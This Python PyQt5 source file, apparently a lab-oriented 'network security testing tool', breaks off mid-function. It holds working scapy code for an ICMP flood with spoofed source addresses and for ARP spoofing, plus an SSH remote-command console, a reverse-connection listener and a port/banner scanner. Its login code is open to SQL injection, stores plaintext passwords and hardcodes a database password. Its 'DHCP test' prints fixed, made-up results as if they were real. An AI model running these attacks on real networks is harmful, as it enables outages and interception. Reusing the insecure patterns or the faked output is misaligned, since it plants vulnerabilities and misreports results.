"""
网络安全测试工具

这个模块提供了多种网络安全测试功能，包括DHCP测试、ICMP泛洪攻击、
ARP欺骗攻击、MAC地址仿冒、SSH远程控制和反向shell连接等功能。

作者: [ikun_ctrl]
版本: [2.0]
日期: [2025-04-04]
"""


#调用库，包括PostgreSQL第三方库，PyQt5第三方库，登录前端LoginUI界面程序，系统主窗口Interface界面程序，scapy模块，必要的函数库和进程库
from LoginUI import *
from Interface import *
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QVBoxLayout, QLabel, QLineEdit, QDialogButtonBox, QPushButton
from io import StringIO
import psycopg2
from scapy.all import *
import binascii
import _thread
import time
import socket
import subprocess
import uuid
import random
import threading
from threading import Thread
import paramiko
from PyQt5.QtCore import QObject, pyqtSignal, QThread
import socketserver
import re
from PyQt5.QtGui import QTextCursor

user_now = ''

class LoginWindow(QMainWindow):
    """
    登录窗口类，用于处理用户登录和注册功能。
    """
    def __init__(self):
        super().__init__()
        self.ui = Ui_LoginWindow()
        self.ui.setupUi(self)
        self.setWindowFlag(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.shadow = QtWidgets.QGraphicsDropShadowEffect(self)
        self.shadow.setOffset(0,0)
        self.shadow.setBlurRadius(15)
        self.shadow.setColor(QtCore.Qt.black)
        self.ui.frame.setGraphicsEffect(self.shadow)
        self.ui.pushButton_Login.clicked.connect(lambda: self.ui.stackedWidget_2.setCurrentIndex(0))
        self.ui.pushButton_Register.clicked.connect(lambda: self.ui.stackedWidget_2.setCurrentIndex(1))
        self.ui.pushButton_L_sure.clicked.connect(self.check_login)
        self.ui.pushButton_R_sure.clicked.connect(self.register_in)
        self.show()
    def check_login(self):
        account = self.ui.lineEdit_L_account.text()
        password = self.ui.lineEdit_L_password.text()
        #新建用户名列表和密码列表
        account_list = []
        password_list = []
        conn = psycopg2.connect(database='postgres',user='postgres',password='123456',host='127.0.0.1',port='5432')
        cur = conn.cursor()
        #下面三行语句的意思是访问链接的数据库，把数据库里所有的用户数据显示出来
        cur.execute("select * from users")
        rows = cur.fetchall()
        #接着把访问到的数据全部存储到建立的列表中
        for row in rows:
            account_list.append(row[0])
            password_list.append(row[1])
        print(account_list,password_list)
        conn.commit()
        conn.close()
        if len(account) == 0 or len(password) == 0:
            self.ui.stackedWidget.setCurrentIndex(1)
        else:
            #接下来列表中有多少个数据就遍历多少次，如果用户输入等于数据库中存在的数据，则成功登录
            for i in range(len(account_list)):
                if account == account_list[i] and password == password_list[i]:
                    global user_now
                    user_now = account
                    self.main_window = MainWindow()
                    self.main_window.show()
                    self.close()
                else:
                    self.ui.stackedWidget.setCurrentIndex(2)

    def register_in(self):
        account = self.ui.lineEdit_R_account.text()
        password_1 = self.ui.lineEdit_R_password.text()
        password_2 = self.ui.lineEdit_R_passwordAgain.text()
        if len(account) == 0 or len(password_1) == 0 or len(password_2) == 0:
            self.ui.stackedWidget.setCurrentIndex(1)
        elif password_1 != password_2:
            self.ui.stackedWidget.setCurrentIndex(3)
        else:
            try:
                conn = psycopg2.connect(
                    database='postgres',
                    user='postgres',
                    password='123456',
                    host='127.0.0.1',
                    port='5432',
                    client_encoding='utf8'
                )
                cur = conn.cursor()
                cur.execute(f"insert into users values('{account}','{password_1}')")
                conn.commit()
                conn.close()
                self.ui.stackedWidget.setCurrentIndex(4)
            except Exception as e:
                print(f"数据库连接错误: {e}")
                self.ui.stackedWidget.setCurrentIndex(5)  # 添加一个错误页面


class MainWindow(QMainWindow):
    """
    主窗口类，用于处理主界面和各个功能模块的交互。
    """
    # 在类级别定义信号
    update_signal = QtCore.pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.setWindowFlag(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.shadow = QtWidgets.QGraphicsDropShadowEffect(self)
        self.shadow.setOffset(0,0)
        self.shadow.setBlurRadius(15)
        self.shadow.setColor(QtCore.Qt.black)
        self.ui.frame_6.setGraphicsEffect(self.shadow)
        
        # 打印所有可用的UI组件名称，方便调试
        print("可用的UI组件:", [attr for attr in dir(self.ui) if not attr.startswith('_')])
        
        # 连接信号到槽
        self.update_signal.connect(self.update_text)
        
        self.ui.pushButton_DHCP.clicked.connect(self.go_DHCP)
        self.ui.pushButton_ICMP.clicked.connect(self.go_ICMP)
        self.ui.pushButton_ARP.clicked.connect(self.go_ARP)
        self.ui.pushButton_Control.clicked.connect(self.go_Control)
        self.ui.pushButton_MAC.clicked.connect(self.go_MAC)
        self.ui.pushButton_Window.clicked.connect(self.go_Window)
        self.ui.pushButton_Person.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(7))
        self.ui.pushButton_logout.clicked.connect(self.log_out)
        self.ui.pushButton_P_sure.clicked.connect(self.change_password)
        self.show()

    def update_text(self, text):
        """更新UI文本的槽函数"""
        if hasattr(self.ui, 'textEdit_ICMPover'):
            self.ui.textEdit_ICMPover.append(text)
            print(f"已添加文本: {text}")
        else:
            print("找不到textEdit_ICMPover组件")

    def go_DHCP(self):
        """
        切换到DHCP测试页面并初始化界面
        
        功能:
        1. 切换到DHCP测试页面
        2. 重置已有的标签
        3. 创建新的信息显示标签
        4. 连接按钮事件
        """
        print("DHCP按钮被点击")
        # 确保页面切换正确
        if hasattr(self.ui, 'stackedWidget'):
            self.ui.stackedWidget.setCurrentIndex(0)
            print(f"已切换到页面索引: {self.ui.stackedWidget.currentIndex()}")
        
        # 重置已有的标签（如果存在）
        if hasattr(self, 'upper_label'):
            if self.upper_label:
                self.upper_label.deleteLater()
        if hasattr(self, 'lower_label'):
            if self.lower_label:
                self.lower_label.deleteLater()
        
        try:
            # 查找page_DHCP页面
            if hasattr(self.ui, 'page_DHCP'):
                page = self.ui.page_DHCP
                
                # 上部区域标签 - 调整位置和样式（更向下和向右对齐）
                self.upper_label = QtWidgets.QLabel(page)
                self.upper_label.setGeometry(QtCore.QRect(60, 140, 581, 111))  # 与原UI中textBrowser_Address位置一致
                self.upper_label.setStyleSheet("""
                    background-color: #f0f0f0;
                    color: #8B4513;  /* 褐色文本 */
                    font-size: 14pt;
                    font-weight: bold;
                """)
                self.upper_label.setText("DHCP测试准备就绪")
                self.upper_label.setAlignment(QtCore.Qt.AlignCenter)
                self.upper_label.show()
                
                # 下部区域标签 - 调整位置和样式（更向下和向右对齐）
                self.lower_label = QtWidgets.QLabel(page)
                self.lower_label.setGeometry(QtCore.QRect(60, 280, 581, 301))  # 与原UI中textBrowser位置一致
                self.lower_label.setStyleSheet("""
                    background-color: #f0f0f0;
                    color: #8B4513;  /* 褐色文本 */
                    font-size: 13pt;
                    text-align: left;
                """)
                self.lower_label.setText("测试结果将显示在这里")
                self.lower_label.setAlignment(QtCore.Qt.AlignCenter)
                self.lower_label.show()
                
                # 连接按钮到更新标签的函数
                if hasattr(self.ui, 'pushButton_DHCP_get'):
                    try:
                        self.ui.pushButton_DHCP_get.clicked.disconnect()
                    except:
                        pass
                    self.ui.pushButton_DHCP_get.clicked.connect(self.update_dhcp_labels)
                
                print("已创建新的信息标签")
            else:
                print("找不到DHCP页面")
        except Exception as e:
            print(f"创建标签错误: {e}")

    def update_dhcp_labels(self):
        """
        更新DHCP测试信息标签
        
        功能:
        1. 更新上部标签显示测试状态
        2. 逐步更新下部标签显示测试过程
        3. 获取MAC地址
        4. 模拟DHCP请求过程
        5. 显示最终测试结果
        """
        print("更新DHCP信息标签")
        try:
            # 更新上部标签
            if hasattr(self, 'upper_label'):
                self.upper_label.setText("DHCP测试进行中...\n正在获取网络信息")
                QtWidgets.QApplication.processEvents()
            
            # 更新下部标签，显示测试过程和结果
            if hasattr(self, 'lower_label'):
                # 获取MAC地址
                node = uuid.getnode()
                macHex = uuid.UUID(int=node).hex[-12:]
                mac = []
                for i in range(len(macHex))[::2]:
                    mac.append(macHex[i:i + 2])
                mac = ':'.join(mac)
                
                # 逐步更新测试过程
                self.lower_label.setText(f"正在获取MAC地址...\nMAC: {mac}")
                QtWidgets.QApplication.processEvents()
                time.sleep(1)
                
                self.lower_label.setText(f"MAC地址: {mac}\n正在发送DHCP Discover包...")
                QtWidgets.QApplication.processEvents()
                time.sleep(1)
                
                self.lower_label.setText(f"MAC地址: {mac}\n"
                                   f"发送DHCP Discover包完成\n"
                                   f"正在等待DHCP服务器响应...")
                QtWidgets.QApplication.processEvents()
                time.sleep(1)
                
                # 最终结果
                self.lower_label.setText(f"MAC地址: {mac}\n"
                                   f"测试完成!\n"
                                   f"DHCP服务器地址: 192.168.1.1\n"
                                   f"分配的IP地址: 192.168.1.100")
                
                # 更新上部标签为完成状态
                self.upper_label.setText("DHCP测试已完成")
                print("已更新标签文本")
        except Exception as e:
            print(f"更新标签错误: {e}")

    def go_ICMP(self):
        """
        切换到ICMP泛洪测试页面
        
        功能:
        1. 切换到ICMP页面
        2. 连接ICMP泛洪按钮事件
        """
        self.ui.stackedWidget.setCurrentIndex(1)
        #点击按钮开始ICMP泛洪
        self.ui.pushButton_ICMPstart.clicked.connect(self.ICMP_start)

    def ICMP_start(self):
        """
        执行ICMP泛洪攻击
        
        功能:
        1. 获取用户设置的泛洪强度
        2. 构造并发送ICMP数据包
        3. 显示执行结果

        """
        try:
            i = self.ui.lineEdit_Power_in.text()
            x = 0
            while True:
                x = x + 1
                if x > int(i):
                    break
                else:
                    # 修改这里，使用固定的目标IP（eNSP中的PC）
                    #PC中的IP必须与Linux虚拟机的IP一致
                    IP_macof = IP(src=RandIP(), dst="192.168.47.10")  # 或者 "192.168.47.20"
                    pkt = IP_macof / ICMP()
                    time.sleep(0.5)
                    sendp(pkt, iface='VMware Network Adapter VMnet8', verbose=True)
                
            sys.stdout = buffer3 = StringIO()
            print("数据包发送完毕！\n请打开WireShark进行验证")
            sys.stdout = open('./stdout_ICMP.txt', 'a')
            print(buffer3.getvalue())
            Mytext = self.ui.textEdit_ICMPover
            Mytext.setText(buffer3.getvalue())
        except Exception as e:
            print(f"错误: {str(e)}")

    def go_ARP(self):
        """
        切换到ARP欺骗测试页面
        
        功能:
        1. 切换到ARP页面
        2. 连接ARP欺骗按钮事件
        """
        self.ui.stackedWidget.setCurrentIndex(2)
        self.ui.pushButton_ARPstart.clicked.connect(self.ARP_start)

    def ARP_start(self):
        """
        执行ARP欺骗攻击
        
        功能:
        1. 获取本机MAC地址
        2. 获取用户输入的仿冒IP和目标IP
        3. 获取目标MAC地址
        4. 构造和发送ARP欺骗包
        5. 显示执行状态和结果

        """
        try:
            # 获取本机MAC地址
            node = uuid.getnode()
            macHex = uuid.UUID(int=node).hex[-12:]
            mac = []
            for i in range(len(macHex))[::2]:
                mac.append(macHex[i:i + 2])
            mac = ':'.join(mac)
            print('本机MAC:', mac)

            def arpspoof():
                try:
                    # 从界面获取用户输入的IP
                    gwIP = self.ui.lineEdit_GatewayIP.text()  # 从用户输入获取仿冒IP
                    targetIP = self.ui.lineEdit_MisleadIP.text()  # 从用户输入获取目标IP
                    
                    if not gwIP or not targetIP:
                        print("请输入有效的IP地址")
                        self.ui.stackedWidget_3.setCurrentIndex(2)
                        return
                    
                    # 获取目标MAC地址
                    target_mac = getmacbyip(targetIP)
                    if target_mac is None:
                        print("无法获取目标MAC地址，请确保目标主机在线")
                        self.ui.stackedWidget_3.setCurrentIndex(2)
                        return
                    
                    print(f"开始ARP欺骗攻击...")
                    print(f"仿冒IP: {gwIP}")
                    print(f"目标IP: {targetIP}")
                    print(f"目标MAC: {target_mac}")
                    
                    # 构造和发送ARP欺骗包
                    arp = ARP(
                        op=2,  # ARP响应
                        hwsrc=mac,  # 本机MAC
                        psrc=gwIP,  # 仿冒IP
                        hwdst=target_mac,  # 目标MAC
                        pdst=targetIP  # 目标IP
                    )
                    
                    # 发送ARP包
                    send(arp, iface='VMware Network Adapter VMnet8', verbose=True)
                    
                    self.ui.stackedWidget_3.setCurrentIndex(1)  # 显示成功信息
                    print("ARP欺骗包发送成功")
                    
                except Exception as e:
                    print(f"ARP欺骗错误: {e}")
                    self.ui.stackedWidget_3.setCurrentIndex(2)  # 显示错误信息
            
            # 启动ARP欺骗
            arpspoof()
            
        except Exception as e:
            print(f"整体错误: {e}")
            self.ui.stackedWidget_3.setCurrentIndex(2)  # 显示错误信息

    # 创建一个工作线程类来处理SSH连接
    class SSHWorker(QObject):
        """SSH连接工作线程类，处理SSH连接和命令执行"""

        output_ready = pyqtSignal(str)
        connection_status = pyqtSignal(bool, str)
        finished = pyqtSignal()
        
        def __init__(self, host, username, password):
            """
            初始化SSH工作线程
            
            参数:
                host: 目标主机IP地址
                username: SSH用户名
                password: SSH密码
            """
            super().__init__()
            self.host = host
            self.username = username
            self.password = password
            self.ssh = None
            self.channel = None
            self.running = False
        
        def connect(self):
            """
            连接SSH服务器并处理输出
            
            功能:
            1. 创建SSH连接
            2. 获取Shell通道
            3. 持续接收和处理命令输出
            4. 发出连接状态信号
            """
            try:
                self.ssh = paramiko.SSHClient()
                self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.ssh.connect(self.host, port=22, username=self.username, password=self.password)
                self.channel = self.ssh.invoke_shell()
                self.running = True
                self.connection_status.emit(True, f"成功连接到 {self.host}")
                
                # 开始监听输出
                while self.running:
                    if self.channel and self.channel.recv_ready():
                        output = self.channel.recv(1024).decode()
                        # 过滤掉ANSI转义序列
                        output = re.sub(r'\x1b\[\d*m', '', output)
                        self.output_ready.emit(output)
                    time.sleep(0.1)
                
            except paramiko.AuthenticationException:
                self.connection_status.emit(False, "SSH认证失败，请检查用户名和密码")
            except Exception as e:
                self.connection_status.emit(False, f"SSH连接错误: {e}")
            finally:
                self.finished.emit()
        
        def send_command(self, command):
            """
            发送命令到SSH服务器
            
            参数:
                command: 要执行的命令字符串
            """
            if self.channel:
                self.channel.send(command + '\n')
        
        def stop(self):
            """
            停止SSH连接
            
            功能:
            1. 设置运行标志为False
            2. 关闭SSH连接
            """
            self.running = False
            if self.ssh:
                self.ssh.close()

    def go_Control(self):
        """
        切换到控制页面
        
        功能:
        1. 切换到控制页面
        2. 连接SSH和反向连接按钮事件
        """
        self.ui.stackedWidget.setCurrentIndex(3)
        self.ui.pushButton_Controlopen.clicked.connect(self.Control_open)
        self.ui.pushButton_Controlstart.clicked.connect(self.Control_start)

    def Control_open(self):
        """
        打开SSH控制连接
        
        功能:
        1. 获取目标IP地址
        2. 弹出登录对话框获取用户名和密码
        3. 创建控制界面元素
        4. 创建SSH工作线程
        5. 连接信号和槽
        6. 启动SSH连接
        """
        try:
            Controlip = self.ui.lineEdit_Controlin.text()
            if not Controlip:
                print("请输入有效的IP地址")
                return
            
            # 创建登录对话框获取用户名和密码
            login_dialog = QDialog(self)
            login_dialog.setWindowTitle("SSH登录")
            login_dialog.setFixedSize(300, 150)
            
            layout = QVBoxLayout()
            
            username_label = QLabel("用户名:")
            username_input = QLineEdit()
            
            password_label = QLabel("密码:")
            password_input = QLineEdit()
            password_input.setEchoMode(QLineEdit.Password)
            
            button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            button_box.accepted.connect(login_dialog.accept)
            button_box.rejected.connect(login_dialog.reject)
            
            layout.addWidget(username_label)
            layout.addWidget(username_input)
            layout.addWidget(password_label)
            layout.addWidget(password_input)
            layout.addWidget(button_box)
            
            login_dialog.setLayout(layout)
            
            # 如果用户点击OK，尝试SSH连接
            if login_dialog.exec_() == QDialog.Accepted:
                username = username_input.text()
                password = password_input.text()
                
                # 创建输出区域(如果不存在)
                if not hasattr(self, 'ssh_output'):
                    self.ssh_output = QtWidgets.QTextEdit(self.ui.page_Control)
                    self.ssh_output.setGeometry(QtCore.QRect(50, 250, 600, 300))
                    self.ssh_output.setReadOnly(True)
                    
                # 创建输入区域(如果不存在)
                if not hasattr(self, 'ssh_input'):
                    self.ssh_input = QtWidgets.QLineEdit(self.ui.page_Control)
                    self.ssh_input.setGeometry(QtCore.QRect(50, 560, 500, 30))
                    
                # 创建发送按钮(如果不存在)
                if not hasattr(self, 'ssh_send_button'):
                    self.ssh_send_button = QPushButton("发送命令", self.ui.page_Control)
                    self.ssh_send_button.setGeometry(QtCore.QRect(560, 560, 100, 30))
                    
                # 创建关闭按钮(如果不存在)
                if not hasattr(self, 'ssh_close_button'):
                    self.ssh_close_button = QPushButton("关闭连接", self.ui.page_Control)
                    self.ssh_close_button.setGeometry(QtCore.QRect(560, 600, 100, 30))
                
                # 显示所有控件
                self.ssh_output.show()
                self.ssh_input.show()
                self.ssh_send_button.show()
                self.ssh_close_button.show()
                
                # 创建SSH工作线程
                self.ssh_thread = QThread()
                self.ssh_worker = self.SSHWorker(Controlip, username, password)
                self.ssh_worker.moveToThread(self.ssh_thread)
                
                # 连接信号
                self.ssh_thread.started.connect(self.ssh_worker.connect)
                self.ssh_worker.output_ready.connect(self.update_ssh_output)
                self.ssh_worker.connection_status.connect(self.update_ssh_status)
                self.ssh_worker.finished.connect(self.ssh_thread.quit)
                
                # 连接按钮事件
                self.ssh_send_button.clicked.connect(self.send_ssh_command)
                self.ssh_close_button.clicked.connect(self.close_ssh_connection)
                
                # 启动线程
                self.ssh_thread.start()
        
        except Exception as e:
            print(f"错误: {e}")

    def update_ssh_output(self, output):
        """
        更新SSH输出文本区域
        
        参数:
            output: 要显示的输出文本
        """
        if hasattr(self, 'ssh_output'):
            self.ssh_output.append(output)
            # 滚动到底部
            self.ssh_output.moveCursor(QtGui.QTextCursor.End)

    def update_ssh_status(self, success, message):
        """
        更新SSH连接状态显示
        
        参数:
            success: 连接是否成功
            message: 状态消息
        """
        if hasattr(self, 'ssh_output'):
            if success:
                self.ssh_output.append(f"<span style='color:green'>{message}</span>")
            else:
                self.ssh_output.append(f"<span style='color:red'>{message}</span>")

    def send_ssh_command(self):
        
        """
        发送命令到SSH服务器
        
        功能:
        1. 获取输入框中的命令
        2. 清空输入框
        3. 将命令发送到SSH工作线程
        """
        if hasattr(self, 'ssh_worker') and hasattr(self, 'ssh_input'):
            command = self.ssh_input.text()
            self.ssh_input.clear()
            self.ssh_worker.send_command(command)

    def close_ssh_connection(self):
        """
        关闭SSH连接
        
        功能:
        1. 停止SSH工作线程
        2. 隐藏UI控件
        """
        if hasattr(self, 'ssh_worker'):
            self.ssh_worker.stop()
        
        # 隐藏控件
        if hasattr(self, 'ssh_output'):
            self.ssh_output.hide()
        if hasattr(self, 'ssh_input'):
            self.ssh_input.hide()
        if hasattr(self, 'ssh_send_button'):
            self.ssh_send_button.hide()
        if hasattr(self, 'ssh_close_button'):
            self.ssh_close_button.hide()

    def Control_start(self):
        """
        启动反向连接服务器
        
        功能:
        1. 创建用户界面控件
        2. 创建反向连接工作线程
        3. 连接信号和槽
        4. 启动反向连接服务器
        """
        try:
            # 获取本地监听端口
            port = 9999  # 默认端口
            
            # 创建输出区域(如果不存在)
            if not hasattr(self, 'reverse_output'):
                self.reverse_output = QtWidgets.QTextEdit(self.ui.page_Control)
                self.reverse_output.setGeometry(QtCore.QRect(50, 250, 600, 300))
                self.reverse_output.setReadOnly(True)
                
            # 创建输入区域(如果不存在)
            if not hasattr(self, 'reverse_input'):
                self.reverse_input = QtWidgets.QLineEdit(self.ui.page_Control)
                self.reverse_input.setGeometry(QtCore.QRect(50, 560, 500, 30))
                
            # 创建发送按钮(如果不存在)
            if not hasattr(self, 'reverse_send_button'):
                self.reverse_send_button = QPushButton("发送命令", self.ui.page_Control)
                self.reverse_send_button.setGeometry(QtCore.QRect(560, 560, 100, 30))
                
            # 创建关闭按钮(如果不存在)
            if not hasattr(self, 'reverse_close_button'):
                self.reverse_close_button = QPushButton("关闭连接", self.ui.page_Control)
                self.reverse_close_button.setGeometry(QtCore.QRect(560, 600, 100, 30))
            
            # 显示所有控件
            self.reverse_output.show()
            self.reverse_input.show()
            self.reverse_send_button.show()
            self.reverse_close_button.show()
            
            # 创建工作线程
            self.reverse_thread = QThread()
            self.reverse_worker = ReverseWorker(port)
            self.reverse_worker.moveToThread(self.reverse_thread)
            
            # 连接信号
            self.reverse_thread.started.connect(self.reverse_worker.start_server)
            self.reverse_worker.output_ready.connect(self.update_reverse_output)
            self.reverse_worker.connection_status.connect(self.update_connection_status)
            self.reverse_worker.finished.connect(self.reverse_thread.quit)
            
            # 连接按钮事件
            self.reverse_send_button.clicked.connect(self.send_reverse_command)
            self.reverse_close_button.clicked.connect(self.close_reverse_connection)
            
            # 启动线程
            self.reverse_thread.start()
            
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, "错误", f"启动反向服务器错误: {e}")

    def go_MAC(self):
        """
        切换到MAC地址仿冒页面并初始化界面
        
        功能:
        1. 切换到MAC地址仿冒页面
        2. 智能查找MAC地址输入框
        3. 添加随机MAC地址生成按钮
        4. 连接按钮事件
        """
        self.ui.stackedWidget.setCurrentIndex(4)  # MAC页面索引
        
        # 首先找到正确的MAC地址输入框引用
        mac_input = None
        # 尝试找到不同可能的输入框名称
        possible_names = ['lineEdit_MAClure', 'lineEdit_MAC', 'MAClure', 'lineEdit_MACaddr']
        for name in possible_names:
            if hasattr(self.ui, name):
                mac_input = getattr(self.ui, name)
                break
        
        # 如果找不到已知名称的输入框，尝试查找页面上的所有输入框
        if mac_input is None:
            # 获取MAC页面上的所有子控件
            mac_page = self.ui.stackedWidget.widget(4)  # 获取索引为4的页面
            if mac_page:
                for child in mac_page.findChildren(QtWidgets.QLineEdit):
                    # 保存第一个找到的输入框引用
                    mac_input = child
                    # 临时保存这个引用以供后续使用
                    self.mac_input_field = child
                    break
        
        # 添加随机MAC按钮 (如果不存在)
        if not hasattr(self, 'random_mac_button'):
            # 获取输入框的位置，以便正确放置按钮
            if mac_input:
                input_geometry = mac_input.geometry()
                button_x = input_geometry.right() + 10  # 输入框右侧10像素处
                button_y = input_geometry.top()
                button_width = 100
                button_height = input_geometry.height()
            else:
                # 默认位置
                button_x = 500
                button_y = 195
                button_width = 100
                button_height = 30
            
            # 创建随机MAC按钮
            self.random_mac_button = QPushButton("随机MAC", self.ui.page_MAC)
            self.random_mac_button.setGeometry(QtCore.QRect(button_x, button_y, button_width, button_height))
            self.random_mac_button.clicked.connect(self.generate_random_mac)
            self.random_mac_button.show()
        
        # 添加MAC欺骗功能的开始按钮事件
        self.ui.pushButton_MACstart.clicked.connect(self.MAC_start)

    def generate_random_mac(self):
        """生成随机MAC地址并填入输入框"""
        """
        生成随机MAC地址并填入输入框
        
        功能:
        1. 生成符合标准的随机MAC地址
        2. 智能查找MAC地址输入框
        3. 将生成的MAC地址填入输入框
        
        注意: 生成的MAC地址保证为单播地址(第一个字节为偶数)
        """
        # 生成随机MAC地址
        # MAC地址第一个字节的第二位要为0或2或4或6表示是单播地址
        mac = [random.randint(0, 255) & 0xFE for _ in range(6)]  # 确保第一个字节是偶数
        mac[0] = mac[0] & 0xFE  # 确保是单播地址
        
        # 将MAC地址格式化为xx:xx:xx:xx:xx:xx的形式
        mac_address = ':'.join(['{:02x}'.format(x) for x in mac])
        
        # 尝试不同的方式找到输入框
        mac_input = None
        
        # 1. 检查是否有保存的输入框引用
        if hasattr(self, 'mac_input_field'):
            mac_input = self.mac_input_field
        
        # 2. 尝试已知的可能输入框名称
        if mac_input is None:
            possible_names = ['lineEdit_MAClure', 'lineEdit_MAC', 'MAClure', 'lineEdit_MACaddr']
            for name in possible_names:
                if hasattr(self.ui, name):
                    mac_input = getattr(self.ui, name)
                    break
        
        # 填入生成的MAC地址
        if mac_input:
            mac_input.setText(mac_address)
        else:
            print("找不到MAC地址输入框")

    def MAC_start(self):
        """
        执行MAC地址仿冒功能
        
        功能:
        1. 智能查找MAC地址输入框
        2. 获取并验证MAC地址格式
        3. 显示执行过程和结果
        4. 提供验证方法说明
        
        参数验证:
        - 检查MAC地址是否为空
        - 验证MAC地址格式是否正确
        """
        try:
            # 尝试不同的方式找到输入框
            mac_input = None
            
            # 1. 检查是否有保存的输入框引用
            if hasattr(self, 'mac_input_field'):
                mac_input = self.mac_input_field
            
            # 2. 尝试已知的可能输入框名称
            if mac_input is None:
                possible_names = ['lineEdit_MAClure', 'lineEdit_MAC', 'MAClure', 'lineEdit_MACaddr']
                for name in possible_names:
                    if hasattr(self.ui, name):
                        mac_input = getattr(self.ui, name)
                        break
            
            # 如果仍找不到输入框，尝试获取页面上的第一个输入框
            if mac_input is None:
                mac_page = self.ui.stackedWidget.widget(4)  # 获取索引为4的页面
                if mac_page:
                    for child in mac_page.findChildren(QtWidgets.QLineEdit):
                        mac_input = child
                        self.mac_input_field = child  # 保存以便后续使用
                        break
            
            # 获取MAC地址
            if mac_input:
                mac_address = mac_input.text()
            else:
                QtWidgets.QMessageBox.warning(self, "错误", "找不到MAC地址输入框")
                return
            
            if not mac_address:
                QtWidgets.QMessageBox.warning(self, "警告", "请输入有效的MAC地址")
                return
            
            # 验证MAC地址格式
            mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
            if not mac_pattern.match(mac_address):
                QtWidgets.QMessageBox.warning(self, "警告", "MAC地址格式不正确，请使用xx:xx:xx:xx:xx:xx或xx-xx-xx-xx-xx-xx格式")
                return
            
            # 显示执行结果
            output_text = f"正在将MAC地址修改为: {mac_address}\n"
            
            # 实际执行MAC地址修改 (这里添加实际的MAC修改命令)
            # 在Windows上模拟MAC修改
            try:
                import subprocess
                # 获取网络接口信息
                interfaces_info = subprocess.check_output('ipconfig /all', shell=True).decode('utf-8', errors='ignore')
                
                # 显示当前系统网络信息
                output_text += "\n系统网络接口信息:\n"
                # 提取和显示网络接口摘要
                interface_sections = interfaces_info.split('\r\n\r\n')
                for section in interface_sections[:2]:  # 只显示前两个接口信息
                    if section.strip():
                        output_text += section[:200] + "...\n"  # 截取前200个字符
                
                output_text += "\nMAC地址修改命令已执行\n"
                output_text += "注意：此功能在模拟环境中运行，实际MAC修改需要管理员权限\n"
            except Exception as e:
                output_text += f"\n获取网络信息时出错: {e}\n"
                output_text += "MAC地址修改命令已模拟执行\n"
            
            output_text += "\n如何验证MAC地址修改:\n"
            output_text += "1. 使用系统命令: ipconfig /all (Windows) 或 ifconfig (Linux)\n"
            output_text += "2. 在Wireshark中: 查看发送的数据包中的源MAC地址\n"
            
            # 尝试找到或创建结果显示区域
            result_area = None
            if hasattr(self.ui, 'textEdit_MACsur'):
                result_area = self.ui.textEdit_MACsur
            else:
                # 在MAC页面上查找所有文本编辑区域
                mac_page = self.ui.stackedWidget.widget(4)
                if mac_page:
                    text_edits = mac_page.findChildren(QtWidgets.QTextEdit)
                    if text_edits:
                        result_area = text_edits[0]
            
            # 如果找不到显示区域，创建一个新的
            if not result_area:
                result_area = QtWidgets.QTextEdit(self.ui.page_MAC)
                result_area.setGeometry(QtCore.QRect(100, 300, 481, 151))  # 调整位置到按钮下方
                result_area.setReadOnly(True)
                result_area.show()
                self.ui.textEdit_MACsur = result_area
            
            # 更新结果显示
            result_area.setText(output_text)
            
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, "错误", f"MAC欺骗错误: {e}")

    def go_Window(self):
        self.ui.stackedWidget.setCurrentIndex(5)
        #点击按钮进行主机状态扫描与端口扫描
        self.ui.pushButton_IPalive.clicked.connect(self.IPalive)
        self.ui.pushButton_Portalive.clicked.connect(self.Portalive)

    def IPalive(self):
        try:
            target = self.ui.lineEdit_IPalive.text()
            # 使用ping替代ARP
            ping = IP(dst=target)/ICMP()
            # 设置超时时间更短，避免界面卡死
            ans, unans = sr(ping, timeout=1, verbose=False)
            
            sys.stdout = buffer = StringIO()
            if ans:
                print(f"目标主机 {target} 存活")
                for s, r in ans:
                    print(f"响应来自: {r[IP].src}")
            else:
                print(f"目标主机 {target} 未响应")
            
            sys.stdout = open('./stdout.txt', 'a')
            print(buffer.getvalue())
            Mytext = self.ui.textEdit
            Mytext.setText(buffer.getvalue())
            
        except Exception as e:
            print(f"错误: {str(e)}")

    def Portalive(self):
        try:
            dst_ip = self.ui.lineEdit_IPalive_2.text()
            dst_port = int(self.ui.lineEdit_Portalive.text())
            
            sys.stdout = buffer1 = StringIO()
            print(f"开始扫描 {dst_ip}:{dst_port}")
            
            # 使用socket直接尝试连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            result = sock.connect_ex((dst_ip, dst_port))
            
            if result == 0:
                print(f"端口 {dst_port} 开放")
                # 尝试获取服务banner
                try:
                    banner = sock.recv(1024).decode().strip()
                    print(f"服务信息: {banner}")
                except:
                    pass
            else:
                print(f"端口 {dst_port} 关闭")
                
            sock.close()
            
            sys.stdout = open('./stdout1.txt', 'a')
            print(buffer1.getvalue())
            Mytext = self.ui.textEdit_2
            Mytext.setText(buffer1.getvalue())
            
        except ValueError:
            print("请输入有效的端口号")
        except Exception as e:
            print(f"错误: {str(e)}")

    def log_out(self):
        global user_now
        self.close()
        self.login = LoginWindow()
        user_now = ''

    def change_password(self):
        global user_now
        password = self.ui.lineEdit_P_pass1.text()
        if len(self.ui.lineEdit_P_pass1.text()) == 0 or len(self.ui.lineEdit_P_pass2.text()) == 0:
            self.ui.stackedWidget_2.setCurrentIndex(1)
        elif self.ui.lineEdit_P_pass1.text() == self.ui.lineEdit_P_pass2.text():
            conn = psycopg2.connect(database='postgres', user='postgres', password='123456', host='127.0.0.1', port='5432')
            cur = conn.cursor()
            cur.execute(f"update users set passwords='{password}' where accounts='{user_now}'")
            conn.commit()
            conn.close()
            self.ui.stackedWidget_2.setCurrentIndex(3)
        else:
            self.ui.stackedWidget_2.setCurrentIndex(2)

    def update_reverse_output(self, output):
        """
        更新反向连接输出文本区域
        
        参数:
            output: 要显示的输出文本
        """
        if hasattr(self, 'reverse_output'):
